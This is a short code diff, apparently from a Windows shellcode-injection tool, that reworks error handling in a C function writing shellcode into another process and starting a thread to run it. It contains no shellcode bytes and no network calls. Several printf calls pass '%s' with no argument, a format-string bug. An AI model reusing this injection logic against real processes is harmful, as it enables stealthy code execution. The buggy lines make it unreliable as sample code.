@@ -69,7 +69,7 @@ int NTShellExec(DWORD process_id){
 
     if(WVMstatus != STATUS_SUCCESS){
         printf("unable to write memory... \n");
-        return EXIT_FAILURE;
+        goto CLEANUP;
     }
 
     printf("wrote %zd-bytes to allocated process memory\n", sizeof(shellcode_x64));
@@ -81,17 +81,26 @@ int NTShellExec(DWORD process_id){
 
     if(hThread == NULL){
         printf("unable to get handle to new thread with error : %ld", GetLastError());
-        return EXIT_FAILURE;
+        goto CLEANUP;
     }
 
     printf("%s waiting for thread to finish executing\n");
     WaitForSingleObject(hThread, INFINITE);
     printf("%s thread finished executing, cleaning up\n");
+    goto CLEANUP;
 
-    CloseHandle(hThread);
-    CloseHandle(hProcess);
+CLEANUP:
+
+	if (hThread) {
+		printf("closing handle to thread\n");
+		CloseHandle(hThread);
+	}
+
+	if (hProcess) {
+		printf("closing handle to process\n");
+		CloseHandle(hProcess);
+	}
+
     printf("%s operation successfully made>>>>");
-
-    //free(sizeShellCode)
     return EXIT_SUCCESS;
 }
